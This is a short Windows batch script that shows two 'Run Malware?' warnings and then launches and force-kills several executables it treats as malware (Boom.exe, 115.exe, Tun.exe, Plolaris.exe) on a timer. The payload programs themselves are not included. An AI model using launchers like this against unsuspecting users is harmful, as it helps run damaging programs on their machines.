@echo off
title LoselconIZ.exe - Warning
cls
echo Run Malware?
pause
title LoselconIZ.exe - Last Warning
cls
echo ARE YOU SURE?? CLOSE IT AND DELETE IT NOW OR YOU WANT TO RUN!!
pause
start Boom.exe
timeout 15
taskkill /f /im Boom.exe
start 115.exe
start Tun.exe
timeout 25
taskkill /f /im 115.exe
taskkill /f /im Tun.exe
start Plolaris.exe
start Tun.exe
start 115.exe
timeout 10
taskkill /f /im Tun.exe
taskkill /f /im Plolaris.exe